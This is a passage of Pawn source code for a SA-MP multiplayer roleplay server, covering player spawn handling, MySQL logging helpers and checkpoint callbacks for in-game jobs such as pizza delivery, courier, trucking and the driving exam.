				SetDynamicObjectMaterial(Omdezapada[playerid][id][1], 0, 3914, "snow", "mp_snow", 0xFFFFFFFF);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][2], 0, 3914, "snow", "mp_snow", 0xFFFFFFFF);
				Omdezapada[playerid][id][3] = CreateDynamicObject(19087, OMZapada[id][PozitieOMZapada][0]-0.5, OMZapada[id][PozitieOMZapada][1], OMZapada[id][PozitieOMZapada][2]+3.0,   0.00000, 40.00000, 0.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][4] = CreateDynamicObject(19087, OMZapada[id][PozitieOMZapada][0]+1.9, OMZapada[id][PozitieOMZapada][1], OMZapada[id][PozitieOMZapada][2]+3.0,   0.00000, -40.00000, 180.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][5] = CreateDynamicObject(1922, OMZapada[id][PozitieOMZapada][0]+0.1, OMZapada[id][PozitieOMZapada][1]+0.75, OMZapada[id][PozitieOMZapada][2]+3.37,   0.00000, 90.00000, 90.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][6] = CreateDynamicObject(1922, OMZapada[id][PozitieOMZapada][0]-0.4, OMZapada[id][PozitieOMZapada][1]+0.75, OMZapada[id][PozitieOMZapada][2]+3.37,   0.00000, 90.00000, 90.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][7] = CreateDynamicObject(1921, OMZapada[id][PozitieOMZapada][0]-0.2, OMZapada[id][PozitieOMZapada][1]+0.7, OMZapada[id][PozitieOMZapada][2]+3.2,   0.00000, 90.00000, 90.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][8] = CreateDynamicObject(19065, OMZapada[id][PozitieOMZapada][0]-0.8, OMZapada[id][PozitieOMZapada][1]+0.5, OMZapada[id][PozitieOMZapada][2]+3.8,   0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][3], 0, 2361, "shopping_freezers", "white", 0xFF000000);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][4], 0, 2361, "shopping_freezers", "white", 0xFF000000);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][5], 0, 2361, "shopping_freezers", "white", 0xFF000000);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][6], 0, 2361, "shopping_freezers", "white", 0xFF000000);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][7], 0, 2361, "shopping_freezers", "white", 0xFF000000);
			}	
		}	
	}
	else
	{
		for(new id = 0; id < sizeof(OMZapada); id++)
		{
			for(new id2 = 0; id2 < 9; id2++)
			{
				if(IsValidDynamicObject(Omdezapada[playerid][id][id2]))
				{
					DestroyDynamicObject(Omdezapada[playerid][id][id2]);
					Omdezapada[playerid][id][id2] = -1;
				}
			}
		}	
	}*/
	if(in_afacere_cu[playerid] >= 0)
	{
		Afacere(playerid, in_afacere_cu[playerid], false);
	}
	if(PlayerInfo[playerid][pPaintBallG] < 1)
	{
		TogglePlayerControllable(playerid, 0);
		bugobiecte[playerid] = 5;
		GameTextForPlayer(playerid, "~w~You have been blocked ~r~5 seconds ~w~for loading objects.", 3000, 4);
	}
	if(JCurier[playerid][0] > 0) 
	{ 
		DestroyVehicle(JCurier[playerid][2]);
		for(new i = 0; i < 4; i++) JCurier[playerid][i] = -1; 
		CP[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	if(JCiment[playerid][0] > 0) 
	{ 
		RemovePlayerAttachedObject(playerid, betonobject1[playerid]);
		DestroyPlayerObject(playerid,betonobject1[playerid]);	
		DestroyPlayerObject(playerid,betonobject2[playerid]);
		DestroyVehicle(JCiment[playerid][2]);
		for(new i = 0; i < 3; i++) JCiment[playerid][i] = -1; 
		CP[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	if(JCariera[playerid][0] > 0) 
	{ 
		for(new t = 0; t < 26; t++)
		{
			if( IsValidDynamicObject( CarieraObiect[playerid][t] ) )
			{
				DestroyDynamicObject(CarieraObiect[playerid][t]);
			}
		}
		DestroyVehicle(JCariera[playerid][2]);
		for(new i = 0; i < 3; i++) JCariera[playerid][i] = -1; 
		CP[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	arefreeze[playerid] = 0;
	/*if(MizaKeno[playerid] > 0)
	{
		MizaKeno[playerid] = 0;
		CancelSelectTextDraw(playerid);
		for(new i = 0; i < sizeof(KenoTD); i++) PlayerTextDrawHide(playerid, KenoTD[i]);
		timerkeno[playerid] = -1;
	}*/
	if(CumparaSkin[playerid] > 0) 
	{
		SetCameraBehindPlayer(playerid);
		CumparaSkin[playerid] = 0;
		CancelSelectTextDraw(playerid);
		for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawHide(playerid, SkinTD[i]);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	}
	if(actorbanca[playerid] > 0) DestroyActor(actorbanca[playerid]),actorbanca[playerid] = -1;
	if(banirob[playerid] > 0) RemovePlayerAttachedObject(playerid,0),banirob[playerid] = -1;
	p_ac[playerid] = 1;
    SetPlayerHealthEx(playerid, 100);
    SetPlayerArmourEx(playerid, 0);
	TextDrawShowForPlayer(playerid, Time);
	TextDrawShowForPlayer(playerid, Date);
	TextDrawShowForPlayer(playerid, Logosv1);
	TextDrawShowForPlayer(playerid, Logosv2);
	if(PlayerInfo[playerid][pWantedLevel] > 0)
	{
    	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
    }
    else
    {
        SetPlayerWantedLevel(playerid, 0);
    }
    DestroyDynamic3DTextLabel(WantedScris[playerid]);
    if(PlayerInfo[playerid][pWantedLevel] > 0)
    {
        Tigaanel[playerid] = 1;
        DestroyDynamic3DTextLabel(WantedScris[playerid]);
    	new str2[256];
    	format(str2,sizeof(str2),"{FF6600}Wanted Level: %d", PlayerInfo[playerid][pWantedLevel]);
    	WantedScris[playerid] = CreateDynamic3DTextLabel(str2, COLOR_SERVER, 0, 0, -20, 20, playerid);
		Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, WantedScris[playerid] , E_STREAMER_ATTACH_OFFSET_Z, 0.48);
	}
    DestroyDynamic3DTextLabel(DeadScris[playerid]);
    if(PlayerInfo[playerid][pWantedLevel] >= 1)
    {
        new str1[256];
        PlayerTextDrawShow(playerid, WantedText[playerid]);
        format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d Minute",wantedlost[playerid]/60+1);
		PlayerTextDrawSetString(playerid, WantedText[playerid], str1);
	}
    SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
    if(OnDuty[playerid] > 0)
	{
		if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
		{
			GivePlayerWeaponEx(playerid, 24, 500);
			GivePlayerWeaponEx(playerid, 3, 1);
			GivePlayerWeaponEx(playerid, 41, 500);
			GivePlayerWeaponEx(playerid, 29, 1000);
			GivePlayerWeaponEx(playerid, 31, 1000);
			SetPlayerArmourEx(playerid, 100);
			SetPlayerHealthEx(playerid, 100);
		}
		if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
 		{
			GivePlayerWeaponEx(playerid, 24, 500);
			GivePlayerWeaponEx(playerid, 3, 1);
			GivePlayerWeaponEx(playerid, 41, 500);
			GivePlayerWeaponEx(playerid, 29, 1000);
			GivePlayerWeaponEx(playerid, 31, 1000);
			SetPlayerArmourEx(playerid, 100);
			SetPlayerHealthEx(playerid, 100);
		}
		if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
 		{
			GivePlayerWeaponEx(playerid, 24, 500);
			GivePlayerWeaponEx(playerid, 41, 500);
			GivePlayerWeaponEx(playerid, 29, 1000);
			GivePlayerWeaponEx(playerid, 31, 1000);
			SetPlayerArmourEx(playerid, 100);
			SetPlayerHealthEx(playerid, 100);
		}
		if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
 		{
			GivePlayerWeaponEx(playerid, 24, 500);
			GivePlayerWeaponEx(playerid, 3, 1);
			GivePlayerWeaponEx(playerid, 41, 500);
			GivePlayerWeaponEx(playerid, 29, 1000);
			GivePlayerWeaponEx(playerid, 31, 1000);
			SetPlayerArmourEx(playerid, 100);
			SetPlayerHealthEx(playerid, 100);
		}
		if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
 		{
			GivePlayerWeaponEx(playerid, 24, 500);
			GivePlayerWeaponEx(playerid, 3, 1);
			GivePlayerWeaponEx(playerid, 41, 500);
			GivePlayerWeaponEx(playerid, 29, 1000);
			GivePlayerWeaponEx(playerid, 31, 1000);
			SetPlayerArmourEx(playerid, 100);
			SetPlayerHealthEx(playerid, 100);
		}
	}
	if(!gPlayerAnimLibsPreloaded[playerid])
	{
   		PreloadAnimLib(playerid,"BOMBER");
   		PreloadAnimLib(playerid,"RAPPING");
    	PreloadAnimLib(playerid,"SHOP");
   		PreloadAnimLib(playerid,"BEACH");
   		PreloadAnimLib(playerid,"SMOKING");
    	PreloadAnimLib(playerid,"FOOD");
    	PreloadAnimLib(playerid,"ON_LOOKERS");
    	PreloadAnimLib(playerid,"DEALER");
    	PreloadAnimLib(playerid,"MISC");
    	PreloadAnimLib(playerid,"SWEET");
    	PreloadAnimLib(playerid,"RIOT");
    	PreloadAnimLib(playerid,"PED");
    	PreloadAnimLib(playerid,"POLICE");
		PreloadAnimLib(playerid,"CRACK");
		PreloadAnimLib(playerid,"CARRY");
		PreloadAnimLib(playerid,"COP_AMBIENT");
		PreloadAnimLib(playerid,"PARK");
		PreloadAnimLib(playerid,"INT_HOUSE");
		PreloadAnimLib(playerid,"FOOD");
		gPlayerAnimLibsPreloaded[playerid] = 1;
	}
	gTeam[playerid] = PlayerInfo[playerid][pTeam];
	if(gTeam[playerid] == 4)
	{
		gTeam[playerid] = 4;
	}
	if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
	{
		gTeam[playerid] = 2;
		PlayerInfo[playerid][pTeam] = 2;
	}
	if(gPlayerLogged[playerid] == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] < 7 && Securitate[playerid] == 0 && problemalogin[playerid] < 1)
	    {
	    	SendClientMessage(playerid, COLOR_ERROR, "** This server requires a Login BEFORE spawn (Kicked) **");
	    	Kick(playerid);
	    }
		return 1;
 	}
 	ChosenSkin[playerid] = 1;
	SetPlayerSpawn(playerid);
	SetPlayerToTeamColor(playerid);
	playerdeath[playerid] = 0;
	Undercover[playerid] = 0;
	SetPlayerTeam(playerid,4);
	if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
	return 1;
}

// LOGS
public Adminlog(string[])
{
	new query[500];
	mysql_format(SQL,query,500,"INSERT INTO log_admin (`log`) VALUES ('%s')",string);
	mysql_tquery(SQL,query,"","");
	return 1;
}

public Factionlog(factionid,psql,lsql,action[])
{
	new query[500];
	mysql_format(SQL,query,sizeof(query),"INSERT INTO factionlog (`factionid`,`player`,`leader`,`action`) VALUES ('%d','%d','%d','%s')",factionid,psql,lsql,action);
	mysql_tquery(SQL,query,"","");
	return 1;
}
// OnPlayerEnterRaceCheckpoint
public OnPlayerEnterRaceCheckpoint(playerid)
{
	new ccar = IsPlayerInAnyVehicle(playerid);
    new tmpcar = GetPlayerVehicleID(playerid);
 	if(pizzaj[playerid] == 1 && PizzaCP[playerid] == 1)
	{
		new string[128];
		DisablePlayerRaceCheckpoint(playerid);
		PizzaCP[playerid] = 0;
		pizzaj[playerid] = 0;
		format(string,sizeof(string),"Pizza delivered! You won %s$. Use /pizza to deliver another pizza!",FormatNumber(pizzaprize[playerid]));
		SCM(playerid,COLOR_GREEN,string);
		GivePlayerCash(playerid,pizzaprize[playerid]);
		Update(playerid, pCashx);
		SetTimerEx("Livrarepizza1", 30000, 0, "i", playerid);
  		SCM(playerid, -1, "{990000} (!) You have 60 seconds to type the command [/pizza], otherwise it will disappear scooter.");
		pizzaprize[playerid] = 0;
		PlayerInfo[playerid][pPizzaRem]--;
		PlayerInfo[playerid][pPizzaTimes]++;
		Update(playerid,pPizzaRemx);
		Update(playerid,pPizzaTimesx);
		if(PlayerInfo[playerid][pPizzaSkill] <= 5)
		{
			if(PlayerInfo[playerid][pPizzaRem] <= 0)
			{
			    PlayerInfo[playerid][pPizzaSkill]++;
   				if(PlayerInfo[playerid][pPizzaSkill] == 2)
				{
					PlayerInfo[playerid][pPizzaRem] = 34;
				}
				else if(PlayerInfo[playerid][pPizzaSkill] == 3)
				{
					PlayerInfo[playerid][pPizzaRem] = 49;
				}
				else if(PlayerInfo[playerid][pPizzaSkill] == 4)
				{
					PlayerInfo[playerid][pPizzaRem] = 89;
				}
				else if(PlayerInfo[playerid][pPizzaSkill] == 5)
				{
					PlayerInfo[playerid][pPizzaRem] = 99;
				}
		    	Update(playerid,pPizzaSkillx);
		    	Update(playerid,pPizzaRemx);
			    format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pPizzaSkill]);
			    SendClientMessage(playerid, COLOR_YELLOW, string);
			}
		}
	}
	if(CP[playerid] == 123456)
	{
		new nrjucatori = 0;
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && racingcar[i] >= 0)
			{
				nrjucatori++;
				DisableRemoteVehicleCollisions(i, 0);
				DisablePlayerRaceCheckpoint(i);
				CP[i] = 0;
				SetVehicleVirtualWorld(racingcar[i], 0);
				DestroyVehicle(racingcar[i]);
				racingcar[i] = -1;
				SetPlayerPos(i, 1154.4122,-1440.0548,15.7969);
				SetPlayerVirtualWorld(i, 0);
				TogglePlayerControllable(i, 1);
			}
		}
		new string[1024];
		format(string, sizeof(string), "News:%s defeated %d players and won the race!",GetName(playerid),nrjucatori);
		SendClientMessageToAll(COLOR_ORANGE,string);
	}
	if(CP[playerid] == 99)
	{
	   DisablePlayerRaceCheckpoint(playerid);
	   CP[playerid] = 0;
	}
	if(CheckBus[playerid] >= 1 && ccar && IsABus(tmpcar))
	{
	    SendClientMessage(playerid, COLOR_SERVER, "Bus stops in the red checkpoints.");
		timerbus[playerid] = SetTimerEx("BusDriverCheck", 3000, 1, "i", playerid);
	}
	new string[MAX_STRING];
	if(CP[playerid] == 100 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid, 0, 442.2747,-1567.2207,25.5071,423.3568,-1579.9683,25.5372, 4.0);
		CP[playerid] = 101;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~1~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 101 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid,0, 423.3568,-1579.9683,25.5372,347.7637,-1578.0192,32.5527, 4.0);
		CP[playerid] = 102;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~2~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 102 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid,0, 347.7637,-1578.0192,32.5527,309.9063,-1582.2460,32.6932, 4.0);
		CP[playerid] = 103;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~3~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 103 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid,0, 309.9063,-1582.2460,32.6932,234.8177,-1590.9211,32.7111, 4.0);
		CP[playerid] = 104;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~4~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 104 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid,0, 234.8177,-1590.9211,32.7111,309.0750,-1643.0486,32.8002, 4.0);
		CP[playerid] = 105;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~5~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 105 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid,0, 309.0750,-1643.0486,32.8002,335.9864,-1623.3308,32.6465, 4.0);
		CP[playerid] = 106;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~6~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 106 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
		DisablePlayerRaceCheckpoint(playerid);
		SetPlayerRaceCheckpoint(playerid,0, 335.9864,-1623.3308,32.6465,394.1027,-1518.7234,31.9202, 4.0);
		CP[playerid] = 117;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~7~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 117 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
	    DisablePlayerRaceCheckpoint(playerid);
	    SetPlayerRaceCheckpoint(playerid,1, 394.1027,-1518.7234,31.9202,0.0,0.0,0.0, 4.0);
		CP[playerid] = 123;
		format(string, sizeof(string), "~w~CHECKPOINTS: ~r~8~w~/~r~8");
		PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
	}
	else if(CP[playerid] == 123 && ccar && IsPlayerInVehicle(playerid, examcar[playerid]))
	{
        PlayerTextDrawHide(playerid, DMVexam[playerid]);
        PlayerTextDrawHide(playerid, DMVcheck[playerid]);
		DisablePlayerRaceCheckpoint(playerid);
		PlayerInfo[playerid][pCarLic] = 1;
		PlayerInfo[playerid][pCarLicT] = 100;
		TakingLesson[playerid] = 0;
		DestroyVehicle(examcar[playerid]);
		DisableRemoteVehicleCollisions(playerid, 0);
		examcar[playerid] = -1;
		new str1[128];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `CarLic`='1',`CarLicT`='100' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
		mysql_tquery(SQL,str1,"","");
		SendClientMessage(playerid, COLOR_SERVER, "Congratulations! Did you get your driving license!");
		CP[playerid] = 0;
	}
    return 1;
}

// OnPlayerLeaveRaceCheckpoint
public OnPlayerLeaveRaceCheckpoint(playerid)
{
	new tmpcar = GetPlayerVehicleID(playerid),
		ccar = IsPlayerInAnyVehicle(playerid);
	if(CheckBus[playerid] >= 1 && ccar && IsABus(tmpcar))
	{
		KillTimer(timerbus[playerid]);
	}
	return 1;
}

// OnPlayerEnterCheckpoint
public OnPlayerEnterCheckpoint(playerid)
{
    new veh	= GetPlayerVehicleID(playerid);
    new engine,lights,alarm,doors,bonnet,boot,objective;
    if(XCheckpoints[playerid] == 0)
    {
       LastCheckpoint[playerid] = gettime();
    }
    XCheckpoints[playerid]++;
    if(XCheckpoints[playerid] == 2)
    {
        if((gettime() - LastCheckpoint[playerid]) <= 2)
        {
			if(UsedFind[playerid] == 0)
			{
				new string[256];
				new playername[MAX_PLAYER_NAME];
				GetPlayerName(playerid, playername, sizeof(playername));
				format(string, 256, "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) may be using teleport hack.", playername, playerid, PlayerInfo[playerid][pLevel]);
				ABroadCast(COLOR_RED,string,1);
				XCheckpoints[playerid] = 0;
				LastCheckpoint[playerid] = 0;
			}
			else
			{
				XCheckpoints[playerid]=0;
			}
        }else
        if((gettime() - LastCheckpoint[playerid]) > 2)
        {
            XCheckpoints[playerid]=0;
        }
	}
	new string[MAX_STRING];
	if(CP[playerid] == 171718)
	{
		if(IsPlayerInVehicle(playerid, JCiment[playerid][2]))
		{
			new Float:z_rot;
            GetVehicleZAngle(GetPlayerVehicleID(playerid), z_rot);
            if(z_rot < 249.6655 || z_rot > 291.7383) return SCM(playerid, COLOR_ERROR, "You have to come in back in checkpoint.");
			TogglePlayerControllable(playerid, 0);
			JCiment[playerid][1] = 127;
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
			betonobject1[playerid] = CreatePlayerObject(playerid,18672,0,0,-1000,0,0,0,100);
			AttachPlayerObjectToVehicle(playerid,betonobject1[playerid], GetPlayerVehicleID(playerid), 0.074999,-4.350000,-0.899999,0.000000,0.000000,-179.099899);
			betonobject2[playerid] = CreatePlayerObject(playerid,3048, 2429.9795, 1932.6199, 4.0410,   0.00000, 0.00000, 0.00000);
			MovePlayerObject(playerid,betonobject2[playerid],2429.8755, 1932.7239, 5.0810,0.2);
			SCM(playerid, COLOR_SERVER, "Downloading cement ...");
			SetVehiclePos(GetPlayerVehicleID(playerid), 2436.6008,1932.3805,7.1944);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 273.1725);
			DisableRemoteVehicleCollisions(playerid, 1);
		}
		else return SCM(playerid, COLOR_ERROR, "You're in the cement truck!");
	}
	if(CP[playerid] == 171717)
	{
		if(IsPlayerInVehicle(playerid, JCiment[playerid][2]))
		{
			TogglePlayerControllable(playerid, 0);
			SCM(playerid, COLOR_SERVER, "Loading cement ...");
			JCiment[playerid][1] = 105;
			DisablePlayerCheckpoint(playerid);
			DisableRemoteVehicleCollisions(playerid, 1);
			CP[playerid] = 0;
		}
		else return SCM(playerid, COLOR_ERROR, "You're in the cement truck!");
	}
	if(CP[playerid] == 151515)
	{
		if(IsPlayerInVehicle(playerid, JCurier[playerid][2]))
		{
			JCurier[playerid][3]++;
			new money = 15000 + random(20000) * PlayerInfo[playerid][pCurierSkill] * 2;
			GivePlayerCash(playerid, money);
			format(string, sizeof(string), "~g~+$%s",FormatNumber(money));
			GameTextForPlayer(playerid, string, 3000, 3);
			PlayerInfo[playerid][pCurierRem]--;
			PlayerInfo[playerid][pCurierTimes]++;
			Update(playerid,pCurierRemx);
			Update(playerid,pCurierTimesx);
			if(PlayerInfo[playerid][pCurierSkill] <= 5)
			{
				if(PlayerInfo[playerid][pCurierRem] <= 0)
				{
					PlayerInfo[playerid][pCurierSkill]++;
					if(PlayerInfo[playerid][pCurierSkill] == 2)
					{
						PlayerInfo[playerid][pCurierRem] = 34;
					}
					else if(PlayerInfo[playerid][pCurierSkill] == 3)
					{
						PlayerInfo[playerid][pCurierRem] = 49;
					}
					else if(PlayerInfo[playerid][pCurierSkill] == 4)
					{
						PlayerInfo[playerid][pCurierRem] = 89;
					}
					else if(PlayerInfo[playerid][pCurierSkill] == 5)
					{
						PlayerInfo[playerid][pCurierRem] = 99;
					}
					Update(playerid,pCurierSkillx);
					Update(playerid,pCurierRemx);
					format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pCurierSkill]);
					SendClientMessage(playerid, COLOR_YELLOW, string);
				}
			}
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
			JCurier[playerid][1] = 100 + random(5);
		}
		else return SCM(playerid, COLOR_ERROR, "You're in the courier's vehicle!");
	}
	if(CP[playerid] == 600)
	{
	    DisablePlayerCheckpoint(playerid);
	    SCM(playerid, COLOR_SERVER,"Type in the [/work] to start working.");
		CP[playerid] = 0;
	}
	if(CP[playerid] == 1999)
	{
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
	}
	if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999)
	{
	    TaxiAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~~h~Reached destination", 5000, 1);
		TaxiCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(GotoMats[playerid] == 1)
	{
	    DisablePlayerCheckpoint(playerid);
	    GotoMats[playerid] = 0;
	    SendClientMessage(playerid, COLOR_YELLOW, "Use /getmats here to collect materials.");
	}
	else if(MatsHolding[playerid] == 1 && CP[playerid] == 6901)
	{
	    DisablePlayerCheckpoint(playerid);
		MatsHolding[playerid] = 0;
		CP[playerid] = 0;
		new totalmats = 1000 + PlayerInfo[playerid][pArmsSkill]*300,strings[64];
		PlayerInfo[playerid][pMats] += totalmats;
		Update(playerid,pMatsx);
		format(strings,sizeof(strings),"%s of collected materials.",FormatNumber(totalmats));
		SendClientMessage(playerid, COLOR_SERVER, strings);
		PlayerInfo[playerid][pArmsRem]--;
		PlayerInfo[playerid][pArmsTimes]++;
		Update(playerid,pArmsRemx);
		Update(playerid,pArmsTimesx);
		if(PlayerInfo[playerid][pArmsSkill] <= 5)
		{
			if(PlayerInfo[playerid][pArmsRem] <= 0)
			{
			    PlayerInfo[playerid][pArmsSkill]++;
   				if(PlayerInfo[playerid][pArmsSkill] == 2)
				{
					PlayerInfo[playerid][pArmsRem] = 34;
				}
				else if(PlayerInfo[playerid][pArmsSkill] == 3)
				{
					PlayerInfo[playerid][pArmsRem] = 49;
				}
				else if(PlayerInfo[playerid][pArmsSkill] == 4)
				{
					PlayerInfo[playerid][pArmsRem] = 89;
				}
				else if(PlayerInfo[playerid][pArmsSkill] == 5)
				{
					PlayerInfo[playerid][pArmsRem] = 99;
				}
		    	Update(playerid,pArmsSkillx);
		    	Update(playerid,pArmsRemx);
			    format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pArmsSkill]);
			    SendClientMessage(playerid, COLOR_YELLOW, string);
			}
		}
	}
	else if(CarJacker[playerid] == 1)
	{
	    new str[MAX_STRING],
	    	money = 50000 + random(10000);
	    DisablePlayerCheckpoint(playerid);
	    CarJacker[playerid] = 0;
	    SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	    GivePlayerCash(playerid, money);
	    Update(playerid, pCashx);
	    format(str,sizeof(str),"You have dropped a vehicle at the crane and earned $%s!", FormatNumber(money));
	    SendClientMessage(playerid, COLOR_SERVER, str);
	    JackAcc[playerid] = 120;
	}
	else if(Trucker[playerid] >= 1)
	{
    	new pertransport,skillmoney,totalmoney;
    	if(!IsPlayerInAnyVehicle(playerid)) return 1;
    	if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)) && IsATruck(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "Nu ai niciun trailer atasat!");
   		DisablePlayerCheckpoint(playerid);
    	DestroyVehicle(viddd[playerid]);
    	viddd[playerid] = 0;
    	if(Trucker[playerid] == 1)
    	{
     		pertransport = 20000 + random(10000);
    		Trucker2[playerid] = 2;
    		SetPlayerCheckpoint(playerid,CHKTruck2[2][0],CHKTruck2[2][1],CHKTruck2[2][2],5.0);
		}
		else if(Trucker[playerid] == 2)
		{
  			pertransport = 27000 + random(10000);
 			Trucker2[playerid] = 2;
 			SetPlayerCheckpoint(playerid,CHKTruck2[4][0],CHKTruck2[4][1],CHKTruck2[4][2],5.0);
		}
		else if(Trucker[playerid] == 3)
		{
		    pertransport = 27000 + random(10000);
	    	Trucker2[playerid] = 3;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[11][0],CHKTruck2[11][1],CHKTruck2[11][2],5.0);
		}
		else if(Trucker[playerid] == 4)
		{
		    pertransport = 27000 + random(10000);
	    	Trucker2[playerid] = 3;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[10][0],CHKTruck2[10][1],CHKTruck2[10][2],5.0);
		}
		else if(Trucker[playerid] == 5)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 3;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[7][0],CHKTruck2[7][1],CHKTruck2[7][2],5.0);
		}
		else if(Trucker[playerid] == 6)
		{
		    pertransport = 35000 + random(15000);
	    	Trucker2[playerid] = 3;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[6][0],CHKTruck2[6][1],CHKTruck2[6][2],5.0);
		}
		else if(Trucker[playerid] == 7)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 3;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[8][0],CHKTruck2[8][1],CHKTruck2[8][2],5.0);
		}
		else if(Trucker[playerid] == 8)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 3;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[9][0],CHKTruck2[9][1],CHKTruck2[9][2],5.0);
		}
		else if(Trucker[playerid] == 9)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 2;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[3][0],CHKTruck2[3][1],CHKTruck2[3][2],5.0);
		}
		else if(Trucker[playerid] == 10)
		{
		    pertransport = 27000 + random(10000);
	    	Trucker2[playerid] = 2;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[5][0],CHKTruck2[5][1],CHKTruck2[5][2],5.0);
		}
		else if(Trucker[playerid] == 11)
		{
		    pertransport = 20000 + random(10000);
	    	Trucker2[playerid] = 4;
	    	SetPlayerCheckpoint(playerid,CHKTruck2[12][0],CHKTruck2[12][1],CHKTruck2[12][2],5.0);
		}
		else if(Trucker[playerid] == 12)
		{
		    pertransport = 27000 + random(15000);
	    	Trucker2[playerid] = 4;
